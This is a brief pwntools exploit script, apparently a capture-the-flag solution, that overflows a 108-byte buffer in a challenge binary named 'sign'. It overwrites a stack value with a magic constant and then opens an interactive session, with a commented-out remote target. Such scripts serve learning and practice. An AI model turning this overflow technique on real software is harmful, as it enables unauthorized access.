from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = process('./sign')
#p = remote('challenge.bluesharkinfo.com',26077)
payload = flat([
    b'A' * 108,
    p64(-1378178390 & 0xffffffffffffffff)
])
p.sendafter(b'do you like blueshark?', payload)
p.interactive()
